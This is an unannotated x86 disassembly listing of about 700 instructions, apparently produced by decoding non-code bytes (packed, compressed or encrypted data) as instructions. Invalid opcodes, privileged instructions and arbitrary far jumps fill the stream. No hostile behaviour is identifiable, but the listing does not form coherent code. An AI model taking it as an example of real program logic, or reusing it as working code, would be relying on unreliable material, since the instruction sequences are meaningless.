  41d8a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8a9:	mov    BYTE PTR [ecx+0x5c],dh
  41d8ac:	push   es
  41d8ad:	int3   
  41d8ae:	pop    edi
  41d8af:	and    BYTE PTR [esi],bh
  41d8b1:	cdq    
  41d8b2:	retf   0xff3c
	...
  41d915:	add    ah,al
  41d917:	ins    BYTE PTR es:[edi],dx
  41d918:	pop    es
  41d919:	pushf  
  41d91a:	scas   eax,DWORD PTR es:[edi]
  41d91b:	(bad)  
  41d91c:	fistp  QWORD PTR [ebx+eiz*8+0x0]
  41d920:	inc    eax
  41d921:	jmp    0x38be:0xb4b645e2
  41d928:	add    DWORD PTR [eax],eax
  41d92a:	pop    es
  41d92b:	add    DWORD PTR [eax],eax
  41d92d:	add    al,ch
  41d92f:	cmp    eax,0x24f92b9d
  41d934:	fisttp WORD PTR [bx+di+0x362e]
  41d939:	clts   
  41d93b:	jmp    0x41d924
  41d93d:	ret    
  41d93e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d93f:	jmp    0x41d914
  41d941:	inc    edi
  41d942:	mov    esi,0x702aa499
  41d947:	fild   QWORD PTR [ebp-0x56]
  41d94a:	adc    BYTE PTR [esi-0x3ec783a8],bh
  41d950:	jp     0x41d8df
  41d952:	outs   dx,DWORD PTR ds:[esi]
  41d953:	adc    edi,esi
  41d955:	fwait
  41d956:	sbb    BYTE PTR [ecx+0x7cb7aa38],dh
  41d95c:	dec    esp
  41d95d:	(bad)  
  41d95e:	push   ebx
  41d95f:	fsubr  QWORD PTR [ebp+0x23]
  41d962:	pusha  
  41d963:	ficomp DWORD PTR [ebp+0x39]
  41d966:	int3   
  41d967:	xchg   esi,eax
  41d968:	xchg   esi,eax
  41d969:	push   esi
  41d96a:	jp     0x41d9a3
  41d96c:	inc    esp
  41d96d:	xchg   esi,eax
  41d96e:	mov    dl,0xc1
  41d970:	sbb    al,0x4
  41d972:	ja     0x41d95d
  41d974:	cs pusha 
  41d976:	mov    ds:0x3abceee7,eax
  41d97b:	mov    eax,0xd8b59e7c
  41d980:	xchg   bl,cl
  41d982:	repz cmp DWORD PTR [edi+0x7],eax
  41d986:	push   esi
  41d987:	sbb    al,0x7c
  41d989:	(bad)  
  41d98a:	stc    
  41d98b:	mov    dh,0x2d
  41d98d:	rcl    DWORD PTR [ebp+0x79],cl
  41d990:	mov    ebx,0xb0cff572
  41d995:	adc    al,BYTE PTR [edi-0xd]
  41d998:	mov    DWORD PTR [ebp+0x5],eax
  41d99b:	shl    edx,cl
  41d99d:	sub    edx,DWORD PTR [edx]
  41d99f:	jae    0x41d9f6
  41d9a1:	lds    esi,FWORD PTR [ebx-0x531e5a1e]
  41d9a7:	sbb    edi,DWORD PTR [edi+0x31878d24]
  41d9ad:	(bad)  
  41d9ae:	outs   dx,DWORD PTR ds:[esi]
  41d9af:	jne    0x41d989
  41d9b1:	mov    edx,0x6358bd5c
  41d9b6:	(bad)  
  41d9b7:	std    
  41d9b8:	jo     0x41d95c
  41d9ba:	stos   BYTE PTR es:[edi],al
  41d9bb:	sub    dh,BYTE PTR [ebx]
  41d9bd:	jmp    0x70ae:0xa828fe73
  41d9c4:	push   edx
  41d9c5:	push   ecx
  41d9c6:	repz xor ecx,edx
  41d9c9:	rcr    DWORD PTR [edx],1
  41d9cb:	popa   
  41d9cc:	shl    DWORD PTR [ecx-0xf],1
  41d9cf:	mov    dh,0xcf
  41d9d1:	xchg   edx,eax
  41d9d2:	fs push ss
  41d9d4:	dec    ecx
  41d9d5:	or     BYTE PTR [esi],cl
  41d9d7:	cmp    ah,BYTE PTR [esp+ecx*1+0x3d]
  41d9db:	xchg   ebx,eax
  41d9dc:	mov    ch,0x81
  41d9de:	aas    
  41d9df:	inc    edx
  41d9e0:	push   es
  41d9e1:	out    dx,al
  41d9e2:	pop    esi
  41d9e3:	test   BYTE PTR [ebp-0x6c],ah
  41d9e6:	iret   
  41d9e7:	mov    ds:0xa4fa30b2,eax
  41d9ec:	sti    
  41d9ed:	pop    ecx
  41d9ee:	aas    
  41d9ef:	paddd  mm1,mm7
  41d9f2:	mov    BYTE PTR [eax],bl
  41d9f4:	call   0x2b6d:0x2790d7b6
  41d9fb:	sub    al,0xf3
  41d9fd:	mov    dh,0xf9
  41d9ff:	adc    eax,0xe7f3a005
  41da04:	dec    ebp
  41da05:	push   ds
  41da06:	dec    edi
  41da07:	mov    ds:0x902f65c8,eax
  41da0c:	sbb    eax,0x52584c6f
  41da11:	sbb    eax,0xde81c1
  41da16:	adc    esp,DWORD PTR [esp+esi*2-0x63]
  41da1a:	jo     0x41da5c
  41da1c:	arpl   WORD PTR [eax],si
  41da1e:	inc    ebx
  41da1f:	pop    esp
  41da20:	shl    esi,1
  41da22:	scas   eax,DWORD PTR es:[edi]
  41da23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da24:	jae    0x41da74
  41da26:	push   esi
  41da27:	retf   0xe064
  41da2a:	sub    BYTE PTR [ebp+0x392d2de4],bh
  41da30:	inc    edx
  41da31:	in     al,0xd2
  41da33:	enter  0x42,0x0
	...
  41da93:	add    BYTE PTR [eax],al
  41da95:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41da9c:	cmp    al,0x5f
  41da9e:	out    dx,al
  41da9f:	lahf   
  41daa0:	push   esi
  41daa1:	pop    es
  41daa2:	test   ebx,esi
  41daa4:	out    dx,al
  41daa5:	add    eax,ebp
  41daa7:	cmp    DWORD PTR [ecx],eax
  41daa9:	add    BYTE PTR [edi],al
  41daab:	add    DWORD PTR [eax],eax
  41daad:	add    BYTE PTR [eax+0x3a7620ab],al
  41dab3:	lahf   
  41dab4:	mov    ecx,0x91bb7021
  41dab9:	cmp    al,0xce
  41dabb:	sub    bl,al
  41dabd:	and    eax,esp
  41dabf:	push   0x20ecc590
  41dac4:	test   BYTE PTR [edi-0x18824cdb],dl
  41daca:	or     bl,cl
  41dacc:	jge    0x41db2b
  41dace:	and    BYTE PTR [esi+eax*4+0x7d5c27bb],al
  41dad5:	bound  ecx,QWORD PTR [edx-0x13c5a67e]
  41dadb:	fucomp st(7)
  41dadd:	dec    esp
  41dade:	push   edx
  41dadf:	fldenv [edx]
  41dae1:	loope  0x41dadb
  41dae3:	lods   eax,DWORD PTR ds:[esi]
  41dae4:	xor    ebx,DWORD PTR [ecx+0x55]
  41dae7:	clc    
  41dae8:	fimul  WORD PTR [esi-0x31]
  41daeb:	aaa    
  41daec:	cmp    eax,ebx
  41daee:	mov    BYTE PTR [ecx],cl
  41daf0:	retf   0xcd5e
  41daf3:	pop    esi
  41daf4:	fwait
  41daf5:	call   0x19c8572f
  41dafa:	mov    dh,0x69
  41dafc:	cmp    eax,0xdec3811d
  41db01:	into   
  41db02:	push   ebp
  41db03:	retf   0x27ac
  41db06:	mov    bh,0x16
  41db08:	cmp    BYTE PTR [esi+0x62d0fba9],0xe0
  41db0f:	mov    cl,0x1c
  41db11:	dec    edx
  41db12:	fldlg2 
  41db14:	sbb    cl,al
  41db16:	outs   dx,DWORD PTR ds:[esi]
  41db17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db18:	sub    eax,0x6c31ceb4
  41db1d:	es push esp
  41db1f:	mov    eax,ds:0xc8b0e4cc
  41db24:	mov    eax,0x541c46fd
  41db29:	push   eax
  41db2a:	(bad)  
  41db2b:	mov    dl,0x82
  41db2d:	mov    bh,0x0
  41db2f:	pushf  
  41db30:	popa   
  41db31:	dec    eax
  41db32:	xor    BYTE PTR [edi],al
  41db34:	dec    ebx
  41db35:	xor    BYTE PTR [ecx+eiz*2-0xa],ch
  41db39:	retf   0x1dbd
  41db3c:	icebp  
  41db3d:	or     eax,0x13dc6e7c
  41db42:	retf   
  41db43:	and    al,0x7e
  41db45:	pop    ecx
  41db46:	hlt    
  41db47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db48:	jne    0x41db37
  41db4a:	test   eax,0x8a2622b9
  41db4f:	inc    ecx
  41db50:	clc    
  41db51:	or     eax,0x5ddbb3a6
  41db56:	out    0xe5,eax
  41db58:	in     eax,0xc9
  41db5a:	mov    dh,0xca
  41db5c:	jns    0x41dba5
  41db5e:	(bad)  
  41db60:	es test al,0x0
  41db63:	xor    dh,al
  41db65:	mov    eax,0xca516c5c
  41db6a:	jg     0x41db10
  41db6c:	push   0x56
  41db6e:	stc    
  41db6f:	ret    
  41db70:	addr16 mov edi,0x31da7051
  41db76:	xchg   edi,eax
  41db77:	gs ja  0x41db88
  41db7a:	mov    eax,ds:0x327285a4
  41db7f:	jmp    0xaa3afe60
  41db84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db85:	leave  
  41db86:	sub    DWORD PTR [eax],edx
  41db88:	jo     0x41db1a
  41db8a:	in     eax,dx
  41db8b:	sub    eax,DWORD PTR [ebx+0x13]
  41db8e:	cmp    eax,0x34c270e
  41db93:	adc    esp,ebx
  41db95:	out    dx,eax
  41db96:	cmp    eax,0x2dd673bd
  41db9b:	pop    ecx
  41db9c:	sar    DWORD PTR [edx],1
  41db9e:	imul   ebp,DWORD PTR [esi+0xc],0x6cdb6766
  41dba5:	sbb    ebp,ebp
  41dba7:	aas    
  41dba8:	ss pop eax
  41dbaa:	pop    esp
  41dbab:	inc    eax
  41dbac:	dec    esp
  41dbad:	push   cs
  41dbae:	scas   eax,DWORD PTR es:[edi]
  41dbaf:	dec    eax
  41dbb0:	and    cl,cl
  41dbb2:	or     esi,DWORD PTR [edi+0x3a]
	...
  41dc15:	add    BYTE PTR [edi-0x36],ch
  41dc18:	adc    eax,0xefdfb598
  41dc1d:	dec    ebp
  41dc1f:	ja     0x41dc8f
  41dc21:	aas    
  41dc22:	push   ebx
  41dc23:	sub    eax,0x3acc8712
  41dc28:	add    DWORD PTR [eax],eax
  41dc2a:	pop    es
  41dc2b:	add    DWORD PTR [eax],eax
  41dc2d:	add    BYTE PTR [edx],ch
  41dc2f:	je     0x41dc00
  41dc31:	inc    ebx
  41dc32:	out    dx,al
  41dc33:	repnz bound ebx,QWORD PTR [edx-0x3fe03a8b]
  41dc3a:	mov    DWORD PTR [edi-0x4547f2bf],edi
  41dc40:	aas    
  41dc41:	add    eax,0xe037248a
  41dc46:	sub    eax,0xd64bdb9c
  41dc4b:	scas   al,BYTE PTR es:[edi]
  41dc4c:	lahf   
  41dc4d:	hlt    
  41dc4e:	xchg   dl,al
  41dc50:	jbe    0x41dc73
  41dc52:	fsubp  st(0),st
  41dc54:	cld    
  41dc55:	and    BYTE PTR [edi],0x47
  41dc58:	(bad)  
  41dc59:	rcl    DWORD PTR [ebp+0xc13b488],1
  41dc5f:	and    cl,dl
  41dc61:	sbb    edi,DWORD PTR [esi-0xe0c8986]
  41dc67:	jno    0x41dc4c
  41dc69:	sub    al,0xcb
  41dc6b:	pop    eax
  41dc6c:	pop    ss
  41dc6d:	daa    
  41dc6e:	xor    DWORD PTR [edi+0x50d9f991],edi
  41dc74:	push   edx
  41dc75:	scas   al,BYTE PTR es:[edi]
  41dc76:	push   ebp
  41dc77:	test   DWORD PTR [eax-0x64],ebx
  41dc7a:	stc    
  41dc7b:	mov    edi,0xb25a3dd7
  41dc80:	gs dec ebx
  41dc82:	push   edx
  41dc83:	and    ah,BYTE PTR [ebp+0x1c9d9ca9]
  41dc89:	mov    al,ds:0x57cb0e07
  41dc8e:	push   edi
  41dc8f:	(bad)  
  41dc90:	dec    eax
  41dc91:	and    eax,0xfa7d8d73
  41dc96:	mov    ebp,0x4fcf3f59
  41dc9b:	push   ebp
  41dc9c:	sbb    ch,cl
  41dc9e:	fdivr  DWORD PTR [edx-0x6847ee6e]
  41dca4:	cdq    
  41dca5:	pop    eax
  41dca6:	rcr    DWORD PTR [edx+eax*4+0x3d],1
  41dcaa:	ss push esi
  41dcac:	jns    0x41dc60
  41dcae:	inc    ecx
  41dcaf:	jns    0x41dcff
  41dcb1:	jne    0x41dc47
  41dcb3:	adc    eax,esp
  41dcb5:	mov    ebp,0xbe0b9f89
  41dcba:	pop    eax
  41dcbb:	add    edi,DWORD PTR [eax-0x27]
  41dcbe:	pop    ecx
  41dcbf:	adc    dh,BYTE PTR [eax-0x39]
  41dcc2:	fcomp  DWORD PTR [eax+0x3c1391b2]
  41dcc8:	push   ds
  41dcc9:	int    0x9e
  41dccb:	jbe    0x41dc87
  41dccd:	add    esp,DWORD PTR [ecx-0x6e]
  41dcd0:	out    0x4e,al
  41dcd2:	or     cl,BYTE PTR cs:[edi]
  41dcd5:	mov    ebx,DWORD PTR [edi-0x5ce02afa]
  41dcdb:	mov    ecx,0xff655689
  41dce0:	or     al,0xb
  41dce2:	xchg   esp,eax
  41dce3:	cmp    BYTE PTR [ebx-0x344e0fa5],al
  41dce9:	repz (bad) 
  41dceb:	xor    bh,BYTE PTR [eiz*4+0x5338bb24]
  41dcf2:	adc    ebp,esp
  41dcf4:	mov    eax,0x2e10bdd2
  41dcf9:	mov    cl,0x74
  41dcfb:	xchg   ebp,eax
  41dcfc:	(bad)  
  41dcfd:	jns    0x41dca1
  41dcff:	test   DWORD PTR [esi+0x374fb9ab],ebx
  41dd05:	rcl    ch,0xdd
  41dd08:	pop    esi
  41dd09:	xchg   ebp,eax
  41dd0a:	lea    eax,[esi+ebp*1-0x3f]
  41dd0e:	xchg   edx,eax
  41dd0f:	ja     0x41dd55
  41dd11:	mov    bl,0xcd
  41dd13:	or     eax,0xe32b5e94
  41dd18:	data16 vpmulhw xmm3,xmm5,XMMWORD PTR [esi+0xc]
  41dd1e:	pop    ebx
  41dd1f:	mov    al,0x9f
  41dd21:	(bad)  
  41dd22:	dec    esp
  41dd23:	pop    edx
  41dd24:	xor    cl,cl
  41dd26:	fistp  WORD PTR [edi+0x31ce8042]
  41dd2c:	mov    eax,0x5a056bfc
  41dd31:	jl     0x41dd17
  41dd33:	cwde   
  41dd34:	xchg   BYTE PTR [eax],al
	...
  41dd96:	and    bl,dh
  41dd98:	das    
  41dd99:	cmp    bh,0xde
  41dd9c:	lods   eax,DWORD PTR ds:[esi]
  41dd9d:	repz mov ds:0x531667bb,eax
  41dda3:	jne    0x41ddeb
  41dda5:	jae    0x41dd7a
  41dda7:	cmp    eax,DWORD PTR [ecx]
  41dda9:	add    BYTE PTR [edi],al
  41ddab:	add    DWORD PTR [eax],eax
  41ddad:	add    BYTE PTR [esi],dh
  41ddaf:	sbb    al,BYTE PTR [ecx+0x22c97a6a]
  41ddb5:	repnz ror BYTE PTR [ebp-0x40],1
  41ddb9:	dec    ebx
  41ddba:	and    eax,0xd4f79975
  41ddbf:	fnstcw WORD PTR [ebx-0x52ec9842]
  41ddc5:	and    dh,BYTE PTR [ecx]
  41ddc7:	data16 or BYTE PTR [bx+si],ah
  41ddcb:	xchg   edx,eax
  41ddcc:	add    ah,cl
  41ddce:	cmp    DWORD PTR ds:0xe32f5ea9,ecx
  41ddd4:	call   esp
  41ddd6:	jge    0x41de17
  41ddd8:	fs mov esi,0xa4a3a04e
  41ddde:	and    ah,dh
  41dde0:	add    ebp,ebp
  41dde2:	add    dl,cl
  41dde4:	lods   al,BYTE PTR ds:[esi]
  41dde5:	push   edi
  41dde6:	jnp    0x41dd9a
  41dde8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dde9:	ins    BYTE PTR es:[edi],dx
  41ddea:	out    0x23,eax
  41ddec:	rcr    dh,cl
  41ddee:	cmp    bl,BYTE PTR [edx-0x2355e6e6]
  41ddf4:	or     al,0xbf
  41ddf6:	lea    ecx,[ebp+0x4e]
  41ddf9:	mov    ecx,0x49f21608
  41ddfe:	div    DWORD PTR [esi]
  41de00:	fist   WORD PTR [ebx+0x19]
  41de03:	mov    al,0xf2
  41de05:	inc    ebx
  41de06:	push   edx
  41de07:	ror    dl,0x73
  41de0a:	jae    0x41dd9c
  41de0c:	movzx  edi,WORD PTR [ecx+0x55]
  41de10:	and    DWORD PTR [esi-0x3fbb9616],edi
  41de16:	push   esp
  41de17:	ins    DWORD PTR es:[edi],dx
  41de18:	arpl   WORD PTR [esi-0x3c],sp
  41de1b:	jg     0x41dda6
  41de1d:	and    cl,BYTE PTR [ebp+0x7d55ed22]
  41de23:	lods   al,BYTE PTR ds:[esi]
  41de24:	adc    DWORD PTR [ebx+0x274262c5],eax
  41de2a:	int3   
  41de2b:	cmp    eax,0x720ac0f7
  41de30:	jmp    0x41de91
  41de32:	mov    bl,0xcd
  41de34:	fwait
  41de35:	pop    eax
  41de36:	mov    WORD PTR [eax-0x25e0bf81],cs
  41de3c:	pop    ss
  41de3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de3e:	daa    
  41de3f:	dec    ebp
  41de40:	adc    eax,0x55331a0
  41de45:	mov    ch,0x96
  41de47:	test   DWORD PTR [ebx+ecx*4-0xc],ebp
  41de4b:	adc    al,0x32
  41de4d:	and    al,0x2
  41de4f:	gs es push ss
  41de52:	frndint 
  41de54:	pop    ecx
  41de55:	and    esi,esi
  41de57:	pop    ecx
  41de58:	or     BYTE PTR [esi],ah
  41de5a:	cs inc ebx
  41de5c:	or     esp,DWORD PTR [edx]
  41de5e:	arpl   WORD PTR [edi],bx
  41de60:	out    dx,eax
  41de61:	mov    ds:0x2a2879c8,eax
  41de66:	outs   dx,BYTE PTR ds:[esi]
  41de67:	mov    bl,0x45
  41de69:	push   esi
  41de6a:	mov    eax,ds:0xaa0dc5ef
  41de6f:	cmp    BYTE PTR [ebx-0x8468e1e],0xb3
  41de76:	lea    ecx,cs:[eax+0x23]
  41de7a:	(bad)  
  41de7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de7c:	sbb    ebx,edi
  41de7e:	call   0x35c3:0x56950ec9
  41de85:	sub    al,0x4b
  41de87:	xchg   edi,eax
  41de88:	not    BYTE PTR gs:[ebp-0x58d629d0]
  41de8f:	fsub   DWORD PTR [esi+ebp*2]
  41de92:	js     0x41de66
  41de94:	dec    edx
  41de95:	jne    0x41df02
  41de97:	bnd jns 0x41dec0
  41de9a:	sti    
  41de9b:	xchg   ebx,eax
  41de9c:	popa   
  41de9d:	or     al,0xcf
  41de9f:	pop    ebp
  41dea0:	cwde   
  41dea1:	sub    DWORD PTR [esi+0x4e],eax
  41dea4:	into   
  41dea5:	and    BYTE PTR [ebx-0x43],0xc4
  41dea9:	cmp    eax,0x73f891d9
  41deae:	lods   eax,DWORD PTR ds:[esi]
  41deaf:	loope  0x41df30
  41deb1:	jno    0x41de70
  41deb3:	add    edx,DWORD PTR [ebp+0x0]
	...
  41df15:	add    BYTE PTR [edi],bh
  41df17:	daa    
  41df18:	push   ss
  41df19:	cld    
  41df1a:	push   ds
  41df1b:	std    
  41df1c:	jmp    edi
  41df1e:	pop    es
  41df1f:	adc    eax,0xf6fbc191
  41df24:	dec    ebp
  41df25:	mov    al,0xda
  41df27:	cmp    al,0x1
  41df29:	add    BYTE PTR [edi],al
  41df2b:	add    DWORD PTR [eax],eax
  41df2d:	add    BYTE PTR [ecx+0x3e],al
  41df30:	sub    ebp,DWORD PTR [eax]
  41df32:	mov    esp,0x8894d779
  41df37:	ror    ah,cl
  41df39:	mov    esp,0x86462aa9
  41df3e:	test   al,0x95
  41df40:	push   eax
  41df41:	cmp    bh,BYTE PTR [ebx-0xe]
  41df44:	addr16 aaa 
  41df46:	xchg   ecx,eax
  41df47:	adc    ecx,edi
  41df49:	daa    
  41df4a:	fimul  WORD PTR [edx+0x6d]
  41df4d:	and    al,0xa9
  41df4f:	clc    
  41df50:	int    0x23
  41df52:	add    ebx,DWORD PTR [ebx-0x48]
  41df55:	out    dx,al
  41df56:	xor    BYTE PTR [edx],ah
  41df58:	mov    edx,0xef9ff09c
  41df5d:	repnz call 0xac77:0x16b05f5b
  41df65:	sbb    esp,edx
  41df67:	xor    ecx,DWORD PTR [esp+edx*4+0x1c]
  41df6b:	enter  0x650d,0xec
  41df6f:	mov    bh,0xe2
  41df71:	xchg   esp,eax
  41df72:	add    BYTE PTR [esi],ch
  41df74:	outs   dx,DWORD PTR ds:[esi]
  41df75:	xchg   edi,eax
  41df76:	xor    BYTE PTR [ebp+ebp*4-0x70],ch
  41df7a:	push   eax
  41df7b:	sbb    eax,DWORD PTR [edi-0x15]
  41df7e:	mov    al,0x44
  41df80:	test   BYTE PTR [ecx+0x7432260b],0x96
  41df87:	out    0x82,eax
  41df89:	mov    bl,0xe5
  41df8b:	sbb    eax,0x7c106cb5
  41df90:	push   0xbbbb6a1f
  41df95:	push   es
  41df96:	imul   DWORD PTR [edx+0x650711df]
  41df9c:	lods   al,BYTE PTR ds:[esi]
  41df9d:	sar    DWORD PTR [ecx*4-0x7c4d0969],0xd8
  41dfa5:	cli    
  41dfa6:	jl     0x41df5c
  41dfa8:	arpl   si,si
  41dfaa:	repz pop ss
  41dfac:	and    dh,BYTE PTR ds:0x80d3f34b
  41dfb2:	clc    
  41dfb3:	test   BYTE PTR [ebp+0x58],0x3f
  41dfb7:	jo     0x41df58
  41dfb9:	retf   
  41dfba:	dec    eax
  41dfbb:	iret   
  41dfbc:	aas    
  41dfbd:	sbb    BYTE PTR [edx+edi*8],ch
  41dfc0:	out    0x6,al
  41dfc2:	lahf   
  41dfc3:	jmp    0x41df9a
  41dfc5:	inc    edx
  41dfc6:	mov    BYTE PTR [edx-0x77],bh
  41dfc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfca:	mov    edx,0x6bd9315a
  41dfcf:	xchg   edi,eax
  41dfd0:	push   ds
  41dfd1:	sbb    bh,BYTE PTR [esi+0x57947c4c]
  41dfd7:	xchg   DWORD PTR [eax+0x7c907b6a],ebp
  41dfdd:	mov    ss,eax
  41dfdf:	(bad)  
  41dfe0:	(bad)  
  41dfe2:	call   0x5292:0x679ea532
  41dfe9:	aad    0x7a
  41dfeb:	push   ds
  41dfec:	push   0x46ff3ed4
  41dff1:	xor    eax,0x31139bf0
  41dff6:	or     DWORD PTR [edx],0x34
  41dff9:	loopne 0x41dfcc
  41dffb:	out    dx,eax
  41dffc:	mov    ecx,0x311015df
  41e001:	shl    BYTE PTR [edi-0x61],0x59
  41e005:	cmp    DWORD PTR [esp+ecx*2-0x34],0x55
  41e00a:	cmc    
  41e00b:	push   esp
  41e00c:	call   0x2800705
  41e011:	push   eax
  41e012:	and    esi,0x66cd0a2
  41e018:	adc    al,0x1e
  41e01a:	imul   ecx,DWORD PTR [ecx],0x68f54906
  41e020:	dec    ebx
  41e021:	stos   BYTE PTR es:[edi],al
  41e022:	lea    esi,es:[edx-0x7ed6219d]
  41e029:	scas   eax,DWORD PTR es:[edi]
  41e02a:	mov    ds:0xdc3a58c9,al
  41e02f:	add    DWORD PTR [edi-0x74cc6908],ebp
	...
  41e095:	add    BYTE PTR [edi+0x53],cl
  41e098:	add    al,0xc
  41e09a:	sbb    al,0x5f
  41e09c:	dec    edi
  41e09d:	push   ebx
  41e09e:	out    0x48,eax
  41e0a0:	jge    0x41e0ce
  41e0a2:	mov    esp,0xe183f39d
  41e0a7:	cmp    eax,0x1070001
  41e0ac:	add    BYTE PTR [eax],al
  41e0ae:	mov    al,ds:0x7b1a7fcf
  41e0b3:	dec    edx
  41e0b4:	aas    
  41e0b5:	aam    0x49
  41e0b7:	jl     0x41e09e
  41e0b9:	pop    edx
  41e0ba:	pop    esp
  41e0bb:	fadd   DWORD PTR [edi-0x11]
  41e0be:	int3   
  41e0bf:	int3   
  41e0c0:	pop    ecx
  41e0c1:	sub    edi,DWORD PTR [edi-0x49b1b50a]
  41e0c7:	jl     0x41e0a7
  41e0c9:	popf   
  41e0ca:	mov    eax,ds:0xbae7084c
  41e0cf:	xchg   ecx,eax
  41e0d0:	mov    ecx,0xc841ca9c
  41e0d5:	and    BYTE PTR [edi+ecx*2+0x1f],ah
  41e0d9:	mov    eax,0x5c7d418
  41e0de:	arpl   si,dx
  41e0e0:	loopne 0x41e065
  41e0e2:	mov    ebx,0x4557f85c
  41e0e7:	xor    al,0xd9
  41e0e9:	cmp    al,0x64
  41e0eb:	cwde   
  41e0ec:	or     dh,BYTE PTR [edi+0x3a58be70]
  41e0f2:	jmp    0x6b3ff0f4
  41e0f7:	scas   al,BYTE PTR es:[edi]
  41e0f8:	push   ss
  41e0f9:	scas   eax,DWORD PTR es:[edi]
  41e0fa:	jmp    0xeb168244
  41e0ff:	xchg   DWORD PTR [edx],eax
  41e101:	(bad)
  41e105:	mov    DWORD PTR [edx-0x35],edi
  41e108:	mov    eax,0xb8a222fd
  41e10d:	jnp    0x41e116
  41e10f:	sub    eax,0xd80d409f
  41e114:	out    0xe3,al
  41e116:	les    ebx,FWORD PTR [ebx+0x2457cb1f]
  41e11c:	sti    
  41e11d:	ins    BYTE PTR es:[edi],dx
  41e11e:	adc    al,0xe3
  41e120:	(bad)  
  41e121:	ret    
  41e122:	sub    dl,BYTE PTR [ebx+0x15b952a9]
  41e128:	mov    ebx,DWORD PTR [edi-0x49]
  41e12b:	xor    cl,BYTE PTR [edi-0x2d9a1bfe]
  41e131:	jmp    0x41e191
  41e133:	push   cs
  41e134:	lods   eax,DWORD PTR ds:[esi]
  41e135:	cmp    bh,BYTE PTR [esp+eax*4+0x3c]
  41e139:	sbb    DWORD PTR [ebx+0x2c5ed0c2],edi
  41e13f:	cdq    
  41e140:	loopne 0x41e0ff
  41e142:	pop    ds
  41e143:	sub    al,dh
  41e145:	pushf  
  41e146:	pop    ss
  41e147:	adc    DWORD PTR [edx],ebx
  41e149:	xlat   BYTE PTR ds:[ebx]
  41e14a:	enter  0x4d6b,0xbc
  41e14e:	jle    0x41e1ca
  41e150:	dec    esp
  41e151:	neg    DWORD PTR [edx+edi*4]
  41e154:	ins    BYTE PTR es:[edi],dx
  41e155:	xchg   edx,eax
  41e156:	jl     0x41e0f2
  41e158:	mov    al,ds:0x72fa1a4b
  41e15d:	sbb    eax,DWORD PTR [esi]
  41e15f:	cmp    al,0xc7
  41e161:	mov    edx,0x5f57b5d9
  41e166:	cmp    dl,0x4b
  41e169:	mov    cl,0x20
  41e16b:	rcl    DWORD PTR [edi+0x70],1
  41e16e:	sbb    DWORD PTR es:0x60b32c16,edx
  41e175:	lods   al,BYTE PTR ds:[esi]
  41e176:	inc    ecx
  41e177:	leave  
  41e178:	mov    ds:0xaf889c8f,al
  41e17d:	in     al,dx
  41e17e:	test   eax,0x644a54bc
  41e183:	pop    esi
  41e184:	mov    BYTE PTR [eax+0x3db03c73],cl
  41e18a:	cwde   
  41e18b:	sub    DWORD PTR [edx],esp
  41e18d:	push   esp
  41e18e:	sbb    al,0xc9
  41e190:	ret    0x8714
  41e193:	ds dec ebx
  41e195:	add    al,0x11
  41e197:	mov    ?,WORD PTR [eax+edi*2-0xe6d308]
  41e19e:	int3   
  41e19f:	xchg   ebp,eax
  41e1a0:	pop    esp
  41e1a1:	xlat   BYTE PTR ds:[ebx]
  41e1a2:	xor    DWORD PTR [edx-0x10c3e934],esi
  41e1a8:	mov    DWORD PTR [ebx-0x8],ebp
  41e1ab:	fs dec ebx
  41e1ad:	push   ss
  41e1ae:	ret    0x2e7e
  41e1b1:	sbb    al,0xab
  41e1b3:	pop    eax
  41e1b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  41e215:	add    BYTE PTR [ebx-0x1988fe],ch
  41e21b:	idiv   DWORD PTR [ebx-0xf75b5b1]
  41e221:	mov    esp,DWORD PTR [esp+ecx*2]
  41e224:	jnp    0x41e252
  41e226:	call   0x741e369
  41e22b:	add    DWORD PTR [eax],eax
  41e22d:	add    BYTE PTR [edx+0x29],al
  41e230:	call   0x8cb7b4d6
  41e235:	fidiv  DWORD PTR [eax+0x19]
  41e238:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e239:	and    eax,0xe7260d02
  41e23e:	loop   0x41e257
  41e240:	push   eax
  41e241:	lea    esi,[edi+edx*8-0x7c]
  41e245:	xor    esi,eax
  41e247:	mov    al,0x6f
  41e249:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e24a:	mov    ch,0x25
  41e24c:	cld    
  41e24d:	hlt    
  41e24e:	xlat   BYTE PTR ds:[ebx]
  41e24f:	cs dec ebp
  41e251:	mov    ds:0x15535661,eax
  41e256:	push   ebx
  41e257:	jmp    FWORD PTR [esi-0x6d]
  41e25a:	and    DWORD PTR [eax],edi
  41e25c:	jp     0x41e2d4
  41e25e:	clc    
  41e25f:	adc    al,0xb
  41e261:	jle    0x41e227
  41e263:	sar    DWORD PTR [ecx],cl
  41e265:	or     edx,ebx
  41e267:	xor    bl,BYTE PTR [edi+0x717f48a5]
  41e26d:	push   ds
  41e26e:	outs   dx,DWORD PTR ds:[esi]
  41e26f:	js     0x41e28a
  41e271:	jnp    0x41e2d7
  41e273:	lock pop ebx
  41e275:	push   ss
  41e276:	test   ch,ch
  41e278:	mov    ?,WORD PTR [ebx+0x21]
  41e27b:	fiadd  WORD PTR [esi]
  41e27d:	push   ss
  41e27e:	push   edi
  41e27f:	sub    DWORD PTR [esi+0x542d2321],esi
  41e285:	cli    
  41e286:	sub    DWORD PTR [ebp+0x17],edi
  41e289:	pop    ds
  41e28a:	retf   
  41e28b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e28c:	pop    es
  41e28d:	std    
  41e28e:	aas    
  41e28f:	and    bh,BYTE PTR [esi-0xcc11546]
  41e295:	das    
  41e296:	jp     0x41e242
  41e298:	clc    
  41e299:	inc    ebp
  41e29a:	mov    eax,0xc636dbb8
  41e29f:	retf   0x8457
  41e2a2:	cld    
  41e2a3:	femms  
  41e2a5:	pop    ecx
  41e2a6:	rcr    BYTE PTR cs:[eax],0x5b
  41e2aa:	ss dec eax
